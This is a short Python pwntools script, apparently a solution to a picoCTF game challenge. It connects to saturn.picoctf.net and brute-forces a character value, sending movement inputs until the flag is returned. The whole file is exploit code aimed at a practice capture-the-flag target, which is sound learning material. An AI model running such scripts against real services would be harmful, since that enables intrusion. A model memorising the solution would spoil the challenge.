#!/usr/bin/python3
#Author: Hack.You

from pwn import *
import string
import warnings

warnings.filterwarnings('ignore')
context.log_level = 'info'

for i in string.printable:
    io = remote('saturn.picoctf.net', 59261)
    io.sendline('l'+i)
    io.sendline(b'w'*4)
    io.sendline(b'd'*47)
    io.sendline(b'wp')
    recv = io.recvall()
    if b'picoCTF' in recv:
        print(f'Remote offset found as {i}')
        break
